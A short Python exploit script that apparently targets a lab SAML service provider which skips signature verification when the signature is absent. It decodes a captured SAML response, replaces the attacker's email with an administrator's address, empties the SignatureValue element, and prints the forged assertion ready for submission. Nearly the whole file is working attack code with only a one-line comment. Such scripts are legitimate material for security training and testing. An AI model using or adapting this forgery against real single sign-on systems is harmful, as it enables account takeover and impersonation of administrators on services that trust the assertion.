import base64
import re
import urllib
import urllib3


# Wrote this script to exploit a vulnerable SAML implementation where the service provider doesn’t check the signature if it isn’t present.

saml_response="PHNhbWxwOlJlc3BvbnNlIElEPSJfNTJlM2QwNDAtMTljYy0wMTNiLTgwMzMtMDI0MmFjMTAwMDEzIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyMi0wOS0xOFQyMjowODoxOFoiIERlc3RpbmF0aW9uPSJodHRwOi8vcHRsLTU1NzQ1YzNlLTdmMDFiMmViLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfNzRkODVjNWYtZTk1ZC00NzExLTk0MzUtOGUyM2YyZjcyMmQ1IiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vaWRwLXB0bC01NTc0NWMzZS03ZjAxYjJlYi5saWJjdXJsLnNvL3NhbWwvYXV0aDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfNTJlM2QyMDAtMTljYy0wMTNiLTgwMzMtMDI0MmFjMTAwMDEzIiBJc3N1ZUluc3RhbnQ9IjIwMjItMDktMThUMjI6MDg6MThaIiBWZXJzaW9uPSIyLjAiPjxJc3N1ZXI%2BaHR0cDovL2lkcC1wdGwtNTU3NDVjM2UtN2YwMWIyZWIubGliY3VybC5zby9zYW1sL2F1dGg8L0lzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6U2lnbmVkSW5mbyB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZD48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiI%2BPC9kczpTaWduYXR1cmVNZXRob2Q%2BPGRzOlJlZmVyZW5jZSBVUkk9IiNfNTJlM2QyMDAtMTljYy0wMTNiLTgwMzMtMDI0MmFjMTAwMDEzIj48ZHM6VHJhbnNmb3Jtcz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI2VudmVsb3BlZC1zaWduYXR1cmUiPjwvZHM6VHJhbnNmb3JtPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6VHJhbnNmb3JtPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ij48L2RzOkRpZ2VzdE1ldGhvZD48ZHM6RGlnZXN0VmFsdWU%2Bd0FKdFo3bldVNUhRdjE4YXU3RWNOSkxDQUFyMzcvR2hRUml1VVcwd3BLYz08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BbkE1YXNaMS9hNDdYKzJXekZFUkY5MDcvRXJhZFBsN2k3bTNpMFRSNXh3NGd6QTdYOGkvdXR0NU1DQlVUejZRNENucE5DNFZVdFdJWnc2YlpPK0t0UGZxOGdxVUtpeWtnZjJ0NkEyVnBnNk9XaXRqYStFMlBMajRkcU9DbDRQR1RFQ2YwdlJFQjhRZ1Zqc3FtcGs0Ry91d3ZlZVZPV0piVGpoZEsvQlV4WTJ3T05lVUJOUEtxWUhRbS9IMnBaVzBUazlJTUk0cUNBcFN1RVFXc3pEWUt5V2s1dWRPWVhFRlc2MldvQ3FRVlcyTWhoNzAvdU1xYjJrQVgzYTAvdjdUckMzeXE4V3gzQmcxTDRjaWZPTWwvNDNnZ255TUlxS1VqOU4zOUZyUk9qdThjN3VRdVg4WWVtRHN2dDFhMFVJR2VxN0E3N3NTRWlIdk9sdnViWkIweHJjSGsvZnUzM1NnZG5EMk9IWDVZbCtqRTY2K2ZKQU5sOUxCeHBTbFdrSXBPZkM3cnJaNkNGeERzOGIyOCt0dFRyYXUxNjlYYklRNHZNcmlOVk5uRGgvaHN3UXpoRkV0TEY4RitEUHlDenl6eWpQOUVyaHFqekdTeTVCM1RJRlBLci9HZ3VaYSs0QlF4ZGFENjY2T2pCQmdWVHY4clpuVlRXUHVTVTVqNUFwWExJc1hNUzJMZm9PLzRhSkZvWWluMlBPQnlPeHRzZzBQdlhUb0k1Mis2MStqb0RBdWVzN1Foc043cEs1WlM3eVplT3BzajdGaSt5eE0weHhDdXpzNXIwa1FMVTN1REpXREtJR2ZYM2tRd08yT0k3VjdHNWJINkl2L2JVbWs3QjIwUHJHamJlNDRlQU9ocWpwRjd5aFBQblJxZU0rM3plZENXWXpKQWNTR2FDbkU9PC9kczpTaWduYXR1cmVWYWx1ZT48S2V5SW5mbyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRk5qQ0NBeDRDQ1FET1ZsM0NyckN4MWpBTkJna3Foa2lHOXcwQkFRc0ZBREJkTVFzd0NRWURWUVFHRXdKQlZURVJNQThHQTFVRUNBd0lWbWxqZEc5eWFXRXhFakFRQmdOVkJBY01DVTFsYkdKdmRYSnVaVEVWTUJNR0ExVUVDZ3dNVUdWdWRHVnpkR1Z5VEdGaU1SQXdEZ1lEVlFRRERBZHpZVzFzWDJscE1CNFhEVEl3TURZd05EQXhORFEwTjFvWERUSXpNRE13TVRBeE5EUTBOMW93WFRFTE1Ba0dBMVVFQmhNQ1FWVXhFVEFQQmdOVkJBZ01DRlpwWTNSdmNtbGhNUkl3RUFZRFZRUUhEQWxOWld4aWIzVnlibVV4RlRBVEJnTlZCQW9NREZCbGJuUmxjM1JsY2t4aFlqRVFNQTRHQTFVRUF3d0hjMkZ0YkY5cGFUQ0NBaUl3RFFZSktvWklodmNOQVFFQkJRQURnZ0lQQURDQ0Fnb0NnZ0lCQUxmeW9iY2dYNE9OR1pPWUFSc01adEhFRncrRytSVEI4Qjd4UVRwdEwwRDZ2RGF2bWNLUUFsUnFFbkdkb05Sa0VOVk9kVElKYTVOOUp0cyt3clN5OWl0bGVHRmMyajMzdjhaK0M0dmF6Tk5IQzYxOG9iOEdZTS9aK0N1aWk1L1lzcklyS0xpZFZLYjg2SFFlaEhCUGk4NUtCcUFsQ3BJRUp3NEpzVTZBdEJhbmhnRGZSUVYvK04wckNDbjlrTk45ZDFTRHNEZ2pnclFnd1ZZVnBvN1FOTlFBcmtHWjkyUVhnWGE3cHkwZzZjbW11aERnUWRoN3Zaa0RVTjk2d1BoMzNMMjFWTVNpUStXL2lLSVBsc0kzckFHS0JjUzVES1BXYllsRXUzb2d1ZzNETHpXbGl4L29qbUtZOXAyaUVJaTVlQTV3Z2x2WkEvN1pZM0wxczdwV08zd0Z0VDBqM1JhYUNQMVhnYjFSUkRhaWlJSXcreTBWdDI3STFhK04reSs0ZWZXeWw0eDgrSHJQbHhoeVJvanZRWWhqbkNHemZ1SUpySVBnMkRhR3JWSDkrWUUxQ3UyZ3pXWmhJRTdMWEd1VEJJZmFWRUFML3U0ZGxwaVloWUx0NmhoNGFRbnpoRnNaOHp5QTZRS0Jhb3lGTndKaGtPY0FWY1dpY2dHVm0zMFpEKytKZlQzK1d1SjFUY01zZktXNnc3QzRVNFV3TTFNVzZpNmdBSnFBTk00dFc3YjF1Wm0zejI4dFRFQ2IzSG11RHFqYnRUaTRydkxGaE80MS9pdlpZOFYwYXZ1aGhvMEhXQnRNMjJKSG9wdEorQ0xmYURFdEhva1lydGZtTFVJaEJtb3pkc3dFTEFMR2VIK1dncWpmYXJyckRueDVRTGs1VERlcDJET1hVRjdOQWdNQkFBRXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnSUJBRjRxMlZPMm1pbUlRdklIdmRFUDFNc21iYlFDRjVGbDc4Yzh5V3F1cm9VeU8rQ2FRNkx6NmVTWXR2SEw3NEJBcnY4WG0vdDZ6RnBIT0tFVmV4OVpmZlpaTTBIRXBpOEcvaXhGZW5Udk1yMUg5TkRmKzlXRzEyRkZKT0o5M2I2NDRHMVd5bmtkclB0UThraVQ3V2RUYVJsQ0txQVpyb3p1ekNkZXhCRkpMN1FIMXlDRkFFVFVKL081VTFybDZaR1RxSDVWQTVEdEJpU0doaXJhaXFXYko4RU5hempzbVk1Zk1pMTlIbFlnOHBub3UxUzZ4WWFhaUtwTmRtZGJydDVpRlpOL2orUUtWS3QrNnU5ZWV5WWdxTTd6UDIwbDFDQTdNNUVqdUFpWGVLbElmQk81eFRpV0NvdSthM1VKbmNTTjNEVkFCVGJiL1FseVk3bFpoVVA3dG9BamFnMlAzbG0yMzdIbkczY1RVWlI2K2JRaUZLZ0s0bUlNTnRHWUo5U0ZOTjJIMjg3MnJUWG16N2l4MGlFK3lJL1lQR2RWNVJVRmEyQ3cxY0xxWjZYZ0J5b3lDZlh3MVh3QzlYS05FdGp3VzJReVgrQzRqSmpvSTVMeGhCOTVUT2EvVzQwRi9Ib08rL0ZyalhmdGZZVEhlRmk3NWh6OE95SWJhNU1sUnRFNEFPL2gzaWJ4OTFjM09IWXJtZ2hzbTUxclJ0SmoyL3h1WEc4MDhHY2lLY3QyRDVvWFZYQWxzMEtXemwycThpbDhaZ3VNYlJIeUt0ZTRFQmJCTjhxNlljRXpGSUdmSDdQd2FWNjdtN2pvNmJJQ2QyT0RPRkRFUzJZZUlFcnlaQ3ZYTGIzdmdTdC96Qm0vQTg0M0RiWWk1U1VKR1doQlE1WG4zTVI3aHl6L25MUnE8L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvS2V5SW5mbz48L2RzOlNpZ25hdHVyZT48U3ViamVjdD48TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6cGVyc2lzdGVudCI%2BYXR0YWNrZXJAZGVtby5jb208L05hbWVJRD48U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBJblJlc3BvbnNlVG89Il83NGQ4NWM1Zi1lOTVkLTQ3MTEtOTQzNS04ZTIzZjJmNzIyZDUiIE5vdE9uT3JBZnRlcj0iMjAyMi0wOS0xOFQyMjoxMToxOFoiIFJlY2lwaWVudD0iaHR0cDovL3B0bC01NTc0NWMzZS03ZjAxYjJlYi5saWJjdXJsLnNvOjgwL3NhbWwvY29uc3VtZSI%2BPC9TdWJqZWN0Q29uZmlybWF0aW9uRGF0YT48L1N1YmplY3RDb25maXJtYXRpb24%2BPC9TdWJqZWN0PjxDb25kaXRpb25zIE5vdEJlZm9yZT0iMjAyMi0wOS0xOFQyMjowODoxM1oiIE5vdE9uT3JBZnRlcj0iMjAyMi0wOS0xOFQyMzowODoxOFoiPjxBdWRpZW5jZVJlc3RyaWN0aW9uPjxBdWRpZW5jZT5odHRwOi8vcHRsLTU1NzQ1YzNlLTdmMDFiMmViLmxpYmN1cmwuc286ODAvc2FtbC9hdXRoPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjItMDktMThUMjI6MDg6MThaIiBTZXNzaW9uSW5kZXg9Il81MmUzZDIwMC0xOWNjLTAxM2ItODAzMy0wMjQyYWMxMDAwMTMiPjxBdXRobkNvbnRleHQ%2BPEF1dGhuQ29udGV4dENsYXNzUmVmPnVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkPC9BdXRobkNvbnRleHRDbGFzc1JlZj48L0F1dGhuQ29udGV4dD48L0F1dGhuU3RhdGVtZW50PjwvQXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U%2B"
admin_email="admin@serviceprovider.com"

#email used in SAML login
hacker_email="attacker@demo.com"

response = base64.b64decode(urllib.parse.unquote(saml_response)).decode("utf-8")
malicious_response = response.replace(hacker_email,admin_email)
without_signature  = re.sub("<ds:SignatureValue>.*<\/ds:SignatureValue>","<ds:SignatureValue></ds:SignatureValue>",malicious_response)

print(urllib.parse.quote(without_signature))